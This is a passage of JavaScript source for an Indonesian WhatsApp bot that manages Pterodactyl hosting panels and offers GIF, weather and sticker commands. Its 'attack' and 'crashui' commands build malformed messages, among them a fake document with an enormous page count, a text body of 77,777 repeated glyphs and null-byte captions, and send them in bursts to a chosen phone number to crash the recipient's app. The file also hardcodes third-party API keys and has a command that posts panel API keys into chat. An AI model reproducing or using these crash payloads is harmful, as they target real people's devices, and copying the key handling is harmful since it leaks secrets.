case 'deluser':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let usr = args[0]; // ID user yang ingin dihapus
 if (!usr) return m.reply('ID usernya mana?');

 try {
 let f = await fetch(domain + "/api/application/users/" + usr, {
 "method": "DELETE",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 // Cek respons
 if (f.ok) {
 m.reply('✅ Sukses menghapus user!');
 } else {
 let res = await f.json();
 let errorMessage = res.errors?.[0]?.detail || 'User tidak ditemukan!';
 m.reply(`❌ Gagal menghapus user: ${errorMessage}`);
 }
 } catch (e) {
 console.error(e);
 m.reply('❌ Terjadi kesalahan saat menghapus user.');
 }
}
break

case 'listadmin':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let page = args[0] ? args[0] : '1';
 let f = await fetch(domain + "/api/application/users?page=" + page, {
 "method": "GET",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey
 }
 });

 let res = await f.json();
 let users = res.data;
 const videoUrl = 'https://files.catbox.moe/et30hu.jpg';

 let teks = `╭─❒ *List Admin Server*\n`;

 for (let user of users) {
 let u = user.attributes;
 if (u.root_admin) { // Cek apakah user adalah admin
 teks += `├ ID : ${u.id}\n`;
 teks += `├ Username : ${u.username}\n`;
 teks += `├ Nama Depan : ${u.first_name}\n`;
 teks += `├ Nama Belakang : ${u.last_name}\n`;
 teks += `├ Status : ${u.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
 teks += `├───────────────\n`;
 }
 }

 teks += `╰─❒ Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` Total Admin: ${res.meta.pagination.count}\n`;

 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 teks += `\n➜ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk melihat halaman berikutnya.`;
 }

 await cupen.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: '❀SalwaCantik❀',
 body: 'Simple Bot WhatsApp.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });
}
break;




case 'listuser':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let page = args[0] ? args[0] : '1';

 let f = await fetch(domain + "/api/application/users?page=" + page, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey
 }
 });

 let res = await f.json();
 if (res.errors) return m.reply(`Gagal mengambil data user: ${JSON.stringify(res.errors[0], null, 2)}`);
 
 let users = res.data;
 if (!users || users.length === 0) return m.reply("Tidak ada user yang ditemukan.");

 let messageText = "Berikut list usernya:\n\n";
 for (let user of users) {
 let u = user.attributes;
 messageText += `ID: ${u.id} - Status: ${u.server_limit === null ? 'Tidak aktif' : 'Aktif'}\n`;
 messageText += `Username: ${u.username}\n`;
 messageText += `Nama: ${u.first_name} ${u.last_name}\n\n`;
 }

 messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 messageText += `Total user: ${res.meta.pagination.total}`;
 await cupen.sendMessage(m.chat, { text: messageText }, { quoted: m });

 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 m.reply(`Gunakan perintah *${prefix + command} ${parseInt(res.meta.pagination.current_page) + 1}* untuk melihat halaman selanjutnya.`);
 }
}
break

case 'listserver':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

 let page = parseInt(args[0]) || 1; // Default ke halaman 1 jika tidak ada input

 try {
 let f = await fetch(domain + `/api/application/servers?page=${page}`, {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": `Bearer ${apikey}`
 }
 });

 let res = await f.json();

 // Cek jika ada error dari API
 if (res.errors) {
 return m.reply(`❌ Gagal mengambil data server:\n${JSON.stringify(res.errors[0], null, 2)}`);
 }

 let servers = res.data;

 // Cek jika tidak ada server ditemukan
 if (!servers || servers.length === 0) {
 return m.reply("❌ Tidak ada server yang ditemukan.");
 }

 const videoUrl = 'https://files.catbox.moe/et30hu.jpg'; // URL video atau GIF

 let teks = `╭─❒ *List Server*\n`;

 for (let server of servers) {
 let s = server.attributes;
 teks += `├ *ID Server*: ${s.id}\n`;
 teks += `├ *Nama*: ${s.name}\n`;
 teks += `├ *Deskripsi*: ${s.description}\n`;
 teks += `├ *Status*: ${s.suspended ? 'Suspend' : 'Aktif'}\n`;
 teks += `├───────────────\n`;
 }

 teks += `╰─❒ *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` *Total Server*: ${res.meta.pagination.total}\n`;

 // Navigasi halaman
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 teks += `\n➜ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk halaman berikutnya.`;
 }

 // Kirim pesan
 await cupen.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: '❀SalwaCantik❀ - List Server',
 body: 'Simple Bot WhatsApp.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data server.");
 }
}
break;

case 'unli':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "0"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/et30hu.jpg'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : ❀SalwaCantik❀*`;

 await cupen.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
case 'giphy':
if (args.length < 2) {
 return cupen.sendMessage(m.chat, {text: 'Harap masukkan kata kunci dan rasio untuk mencari GIF. Contoh: .giphy kucing 16:9'});
 }

 const query = args.slice(0, args.length - 1).join(" ");
 const ratio = args[args.length - 1]; 

 const giphyApiKey = 'ERNiZMa3nz2NmHutk8BN36wJ5wRhtOIZ';
 const giphyUrl = `https://api.giphy.com/v1/gifs/search?api_key=${giphyApiKey}&q=${encodeURIComponent(query)}&limit=3`;

 try {
 const res = await fetch(giphyUrl);
 const json = await res.json();

 if (json.data.length > 0) {
 const gifs = json.data.slice(0, 3);

 let sizeOption = 'fixed_width'; 
 if (ratio === '16:9') {
 sizeOption = 'fixed_width';
 } else if (ratio === '1:1') {
 sizeOption = 'fixed_height';
 }

 const gifUrls = gifs.map((gif) => gif.images.original_mp4 ? gif.images.original_mp4.mp4 : gif.images.original.mp4);

 if (gifUrls.length === 3) {
 for (let i = 0; i < gifUrls.length; i++) {
 await cupen.sendMessage(m.chat, {
 video: { url: gifUrls[i] },
 caption: `GIF ${i + 1} hasil pencarian untuk: ${query} dengan ukuran: ${ratio}`,
 mimetype: 'video/mp4',
 });
 }
 return;
 } else {
 return cupen.sendMessage(m.chat, {text: `Tidak ditemukan tiga GIF untuk: ${query}`});
 }
 } else {
 return cupen.sendMessage(m.chat, {text: `Tidak ditemukan GIF untuk: ${query}`});
 }
 } catch (error) {
 console.error(error);
 return cupen.sendMessage(m.chat, {text: 'Terjadi kesalahan saat mengambil GIF dari GIPHY. Harap coba lagi nanti.'});
 }
 break
case 'cuaca':
if (args.length === 0) {
 return cupen.sendMessage(m.chat, {
 text: "Harap masukkan nama kota setelah perintah, contoh: `.cuaca Jakarta`",
 });
 }

 const city = args.join(" ");
 const weatherApiKey = 'b4e61a9a74f943babc901855243011'; // Ganti dengan API key Anda
 const weatherUrl = `https://api.weatherapi.com/v1/current.json?key=${weatherApiKey}&q=${city}&lang=id`;

 try {
 const response = await axios.get(weatherUrl);

 // Cek jika ada error dari API
 if (response.data.error) {
 return cupen.sendMessage(m.chat, {
 text: `❌ Terjadi kesalahan: ${response.data.error.message}. Pastikan nama kota sudah benar.`,
 });
 }

 // Ambil data cuaca dari response
 const weatherData = response.data;
 const weatherInfo = `
 *Cuaca di ${weatherData.location.name}, ${weatherData.location.country}*
 🌡️ *Suhu*: ${weatherData.current.temp_c}°C
 ☁️ *Kondisi*: ${weatherData.current.condition.text}
 💨 *Kecepatan Angin*: ${weatherData.current.wind_kph} km/h
 💧 *Kelembapan*: ${weatherData.current.humidity}%
 🌅 *Waktu*: ${weatherData.location.localtime}
 `;

 // Mengirim informasi cuaca
 return cupen.sendMessage(m.chat, {
 text: weatherInfo,
 });

 } catch (error) {
 // Tangani kesalahan saat request API
 console.error('Kesalahan:', error);
 return cupen.sendMessage(m.chat, {
 text: "❌ Terjadi kesalahan saat mengambil informasi cuaca. Harap coba lagi nanti.",
 });
 }
 break
case 'shortlink':
{
 try {
 const url = text.trim();
 if (!url || !url.startsWith('http')) {
 return cupen.sendMessage(m.chat, { 
 text: '*🚫 Harap masukkan URL yang valid (contoh: https://example.com).*' 
 }, { quoted: m });
 }

 const response = await axios.get(`https://tinyurl.com/api-create.php?url=${url}`);
 const shortUrl = response.data;

 cupen.sendMessage(m.chat, { 
 text: `*🔗 Link Pendek:*\n\n${shortUrl}` 
 }, { quoted: m });
 } catch (error) {
 console.error('Error memperpendek URL:', error);
 cupen.sendMessage(m.chat, { 
 text: `*❌ Terjadi kesalahan saat memperpendek URL.*\n\nDetail: ${error.message}` 
 }, { quoted: m });
 }
}
break

case 'sticker':
{
 try {
 if (!m.quoted) {
 return cupen.sendMessage(m.chat, { 
 text: '*🚫 Balas pesan gambar/video atau kirim gambar/video untuk dijadikan sticker.*' 
 }, { quoted: m });
 }

 const quotedMsg = m.quoted;
 const mime = quotedMsg.mimetype || '';

 if (!/image|video/.test(mime)) {
 return cupen.sendMessage(m.chat, { 
 text: '*🚫 File yang dibalas harus berupa gambar atau video.*' 
 }, { quoted: m });
 }

 const isImage = /image/.test(mime);
 const isVideo = /video/.test(mime);

 // Pastikan video berdurasi pendek (max 10 detik)
 if (isVideo && (quotedMsg.seconds > 10)) {
 return cupen.sendMessage(m.chat, { 
 text: '*🚫 Video terlalu panjang. Maksimal 10 detik.*' 
 }, { quoted: m });
 }

 // Unduh media
 const media = await cupen.downloadMediaMessage(quotedMsg);
 if (!media) {
 return cupen.sendMessage(m.chat, { 
 text: '*❌ Gagal mengunduh media. Harap coba lagi.*' 
 }, { quoted: m });
 }

 // Kirim stiker
 cupen.sendMessage(
 m.chat,
 { 
 sticker: media, 
 mimetype: 'image/webp', 
 packname: 'MyBot Sticker', 
 author: '❀SalwaCantik❀ Bot' 
 },
 { quoted: m }
 );
 } catch (error) {
 console.error('Error pada case sticker:', error);
 cupen.sendMessage(m.chat, { 
 text: `*❌ Terjadi kesalahan saat membuat sticker.*\n\nDetail: ${error.message}` 
 }, { quoted: m });
 }
}
break
case 'setppbot':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 try {
 // Memeriksa apakah pengguna mereply atau mengirim gambar
 const mediaMessage = m.message.imageMessage || (m.quoted && m.quoted.message.imageMessage);
 if (!mediaMessage) {
 return cupen.sendMessage(m.chat, { 
 text: '*🚫 Harap reply atau kirimkan sebuah gambar untuk dijadikan foto profil bot.*' 
 }, { quoted: m });
 }

 const mediaBuffer = await cupen.downloadMediaMessage(mediaMessage);

 await cupen.updateProfilePicture(cupen.user.id, mediaBuffer);

 cupen.sendMessage(m.chat, { 
 text: '*✅ Foto profil bot berhasil diubah.*' 
 }, { quoted: m });
 } catch (error) {
 console.error('Error saat mengganti foto profil bot:', error);
 cupen.sendMessage(m.chat, { 
 text: `*❌ Terjadi kesalahan saat mengganti foto profil bot.*\n\nDetail: ${error.message}` 
 }, { quoted: m });
 }
}
break
case 'attack':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (!text) return m.reply(`*Format salah!*\nContoh: ${prefix + command} <nomor target>`);

 const targetJid = text.includes('@s.whatsapp.net') ? text : `${text.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
 const thumbnail = fs.readFileSync('./media/thumbnail.jpg'); 
 
 async function ClPmNull(X, Qtd, ThM, cct = false, ptcp = true) {
 let etc = generateWAMessageFromContent(
 X,
 proto.Message.fromObject({
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 header: {
 title: "",
 documentMessage: {
 url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
 mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
 fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
 fileLength: "9999999999999",
 pageCount: 9007199254740991,
 mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
 fileName: "⿻ CrazyCrash ⿻",
 fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
 directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
 mediaKeyTimestamp: "1723855952",
 contactVcard: true,
 thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
 thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
 thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
 jpegThumbnail: ThM,
 },
 hasMediaAttachment: true,
 },
 body: {
 text: "⭑̤▾ ⿻ CrazyUi ⿻ ▾⭑" + "ꦾ" + "ꦾ".repeat(77777),
 },
 nativeFlowMessage: {
 messageParamsJson: '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
 },
 },
 },
 },
 }),
 {
 userJid: X,
 quoted: Qtd,
 }
 );

 await cupen.relayMessage(
 X,
 etc.message,
 ptcp
 ? {
 participant: {
 jid: X,
 },
 }
 : {}
 );
 console.log(chalk.green("𝗧𝗪 𝗖𝗜𝗟𝗟"));
 }

 // Function to send multiple messages
 async function sendMultipleMessages(targetJid, thumbnail, count = 5) {
 for (let i = 0; i < count; i++) {
 try {
 await ClPmNull(targetJid, m, thumbnail, false, true); // Send message
 console.log(`Pesan ke-${i + 1} berhasil dikirim!`);
 } catch (error) {
 console.log(`❌ Gagal mengirim pesan ke-${i + 1}: ${error.message}`);
 }
 }
 }

 // Call the function to send multiple messages (default 5 messages)
 try {
 await sendMultipleMessages(targetJid, thumbnail, 5); // Adjust count as needed
 m.reply(`Sukses Send Bug Ke : ${text}`);
 } catch (error) {
 m.reply(`❌ *Gagal mengirim pesan:* ${error.message}`);
 }
 }
 break
case 'crashui':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (!text) return m.reply(`*Format salah!*\nContoh: ${prefix + command} 628xxxxxxxxxx 1`);

 const args = text.split(' ');
 const targetJid = args[0].includes("@s.whatsapp.net") ? args[0] : `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net`;
 const count = parseInt(args[1]) || 5; // Default 5 pesan jika jumlah tidak disebutkan

 async function sendViewOnceMessage(receiverJid) {
 try {
 const generatedMessage = generateWAMessageFromContent(
 receiverJid,
 proto.Message.fromObject({
 viewOnceMessage: {
 message: {
 liveLocationMessage: {
 degreesLatitude: Math.random() * 180 - 90, // Random latitude
 degreesLongitude: Math.random() * 360 - 180, // Random longitude
 caption: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ‌‌ 𝙏𝙍𝘼𝙎𝙃" + "\0".repeat(100), // Pesan error
 sequenceNumber: `${Math.floor(Math.random() * 1000)}`, // Random urutan
 jpegThumbnail: Buffer.from([]), // Thumbnail kosong
 }
 }
 }
 }),
 {
 userJid: receiverJid,
 }
 );

 await cupen.relayMessage(receiverJid, generatedMessage.message, {
 messageId: generatedMessage.key.id,
 });
 } catch (error) {
 console.error("❌ Gagal mengirim Bug:", error);
 }
 }

 async function sendMultipleMessages(receiverJid, count) {
 try {
 await Promise.all(
 Array.from({ length: count }).map(() => sendViewOnceMessage(receiverJid))
 );
 m.reply(`Sukses Send Bug ${args[0]}`);
 } catch (error) {
 m.reply(`❌ Terjadi kesalahan saat mengirim pesan: ${error.message}`);
 }
 }

 sendMultipleMessages(targetJid, count);
}
break
    case 'totalfitur': {
    const totalFitur = () => {
        const mytext = fs.readFileSync("./cupen.js").toString();
        const numUpper = (mytext.match(/case '/g) || []).length;
        return numUpper;
    };

    const videoUrl = 'https://files.catbox.moe/et30hu.jpg'; // URL video yang ingin digunakan

    let teks = `
┌───「 *❀SalwaCantik❀* 」───
│ ⚙️ *Total Fitur*: ${totalFitur()}
│ 🛠️ *Developer*: ❀SalwaCantik❀
└───────────────────
`;

    await cupen.sendMessage(m.chat, {
        video: { url: videoUrl },
        caption: teks,
        gifPlayback: true,
        gifAttribution: 1,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: '❀SalwaCantik❀',
                body: 'Simple Bot WhatsApp.',
                mediaType: 1,
                renderLargerThumbnail: false,
            },
        },
    }, { quoted: m });
}
break;

case 'cadmin':
{
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner dan Pengguna Premium');

 let username, nomornya;

 if (m.quoted && !q.includes('-')) {
 // Opsi 1: Dengan Reply Pesan
 username = q.trim();
 if (!username) return m.reply(`*Format salah!*\nContoh penggunaan:\n.cadmin username (dengan reply pesan)`);
 
 nomornya = m.quoted.sender; // Nomor dari pengirim pesan yang di-reply
 } else if (q.includes('-')) {
 // Opsi 2: Dengan format username-nomor atau username-mention
 let [nameInput, nomorInput] = q.split('-').map(v => v.trim());
 username = nameInput;
 if (!username) return m.reply(`*Format salah!*\nContoh penggunaan:\n.cadmin username-nomor\n.cadmin username-@tag`);

 // Cek apakah input menggunakan mention atau nomor
 nomornya = nomorInput.includes('@') 
 ? m.mentionedJid && m.mentionedJid[0] 
 : nomorInput.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
 } else {
 return m.reply(`*Format salah!*\nPenggunaan:\n.cadmin username (dengan reply pesan)\n.cadmin username-nomor/mention`);
 }

 if (!nomornya) return m.reply(`*Nomor tidak valid!*\nContoh penggunaan:\n.cadmin username-6289502445574\n.cadmin username-@taguser`);

 let email = `${username}@gmail.com`;
 let password = username + "❀SalwaCantik❀"; // Password dibuat dari username + string tambahan

 try {
 // =======================
 // Buat Admin
 // =======================
 let f = await fetch(global.domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: "Admin",
 language: "en",
 root_admin: true, // User di-set sebagai admin
 password: password.toString()
 })
 });

 let data = await f.json();
 if (data.errors) return m.reply(`❌ Gagal membuat admin!\n${JSON.stringify(data.errors[0], null, 2)}`);

 let user = data.attributes;

 // =======================
 // Kirim Pesan Konfirmasi
 // =======================
 let tks = `*_Paket Telah Terkirim Dengan Selamat✅_*`;
 await cupen.sendMessage(m.chat, { text: tks }, { quoted: m });

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/et30hu.jpg'; // URL video 
 const thumbnailUrl = 'https://files.catbox.moe/fh0a6r.jpg'; // URL thumbnail (opsional)

 // =======================
 // Kirim Detail Akun ke Nomor Target
 // =======================
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*
`;

 await cupen.sendMessage(nomornya, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: '❀SalwaCantik❀',
 body: 'Simple Bot WhatsApp.',
 mediaType: 1,
 thumbnailUrl: thumbnailUrl,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Admin berhasil dibuat dan detailnya telah dikirim ke nomor ${nomornya.split('@')[0]}`);
 } catch (error) {
 console.error(error);
 m.reply('❌ Terjadi kesalahan saat membuat admin. Silakan coba lagi.');
 }
 break;
}

case 'linkserver':
{
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

 const videoUrl = 'https://files.catbox.moe/et30hu.jpg';

 let teks = `
┌───「 *❀SalwaCantik❀* 」───
│ *Domain* : ${global.domain}
│ *Apikey* : ${global.apikey}
│ *Capikey* : ${global.capikey}
│ *Domain 2* : ${global.domain2}
│ *Apikey 2* : ${global.apikey2}
│ *Capikey 2* : ${global.capikey2}
│ *Domain 3* : ${global.domain3}
│ *Apikey 3* : ${global.apikey3}
│ *Capikey 3* : ${global.capikey3}
└───────────────────
`;

 await cupen.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: '❀SalwaCantik❀',
 body: 'Simple Bot WhatsApp.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });
}
break;

case 'updomain':{
    if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text;
 global.domain = newteks;

 await cupen.sendMessage(m.chat, { text: "_Berhasil Mengganti Domain Panel✅_" }, { quoted: m });
 } else {
 await cupen.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Domain>` }, { quoted: m });
 }
}
break

case 'upapikey':{
    if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (!text && !m.quoted) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);

 const newteks = m.quoted ? m.quoted.text : text;

 if (newteks) {
 global.apikey = newteks;
 return cupen.sendMessage(m.chat, { text: "_Berhasil Mengganti Apikey Panel✅_" });
 } else {
 return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);
 }
}
break

  
    




case 'clearadmin': {
    const argsString = body.trim();
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludeIds.length === 0) {
        return m.reply('Tolong masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: .clearadmin , 48, 49, 50');
    }

    try {
        let f = await fetch(domain + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return m.reply('Tidak ada user yang ditemukan.');
        }

        for (let user of users) {
            let u = user.attributes;

            // Jika ID user ada di daftar pengecualian, lewati proses penghapusan
            if (excludeIds.includes(u.id.toString())) {
                m.reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n> *_© Developer : ❀SalwaCantik❀_*`);
                continue;
            }

            let deleteUser = await fetch(domain + "/api/application/users/" + u.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            });

            if (deleteUser.ok) {
                m.reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n> *_© Developer : ❀SalwaCantik❀_*`);
            } else {
                let errorText = await deleteUser.text();
                m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
            }
        }

        m.reply('Semua user, kecuali yang dikecualikan, berhasil dihapus!');
    } catch (error) {
        return m.reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}

case 'clearserver': {
    const argsString = body.trim();
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludedIds.length === 0) {
        return m.reply('Tolong masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: .clearserver , 101, 102, 103');
    }

    try {
        // Mendapatkan daftar server
        let f = await fetch(domain + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let res = await f.json();
        let servers = res.data;

        if (!servers || servers.length === 0) {
            return m.reply('Tidak ada server yang ditemukan.');
        }

        for (let server of servers) {
            let s = server.attributes;

            // Jika server ID ada di daftar pengecualian, lewati
            if (excludedIds.includes(s.id.toString())) {
                m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
                continue;
            }

            // Menghapus server
            let deleteServer = await fetch(domain + "/api/application/servers/" + s.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            });

            if (deleteServer.ok) {
                m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
            } else {
                let errorText = await deleteServer.text();
                m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
            }
        }

        m.reply('*Semua server berhasil dihapus kecuali yang dikecualikan!*');
    } catch (error) {
        return m.reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}

case 'clearserver2': {
    const argsString = body.trim();
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludedIds.length === 0) {
        return m.reply('Tolong masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: .clearserver2 , 201, 202, 203');
    }

    try {
        // Mendapatkan daftar server dari server 2
        let f = await fetch(global.domain2 + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey2,
            }
        });

        let res = await f.json();
        let servers = res.data;

        if (!servers || servers.length === 0) {
            return m.reply('Tidak ada server yang ditemukan di server 2.');
        }

        for (let server of servers) {
            let s = server.attributes;

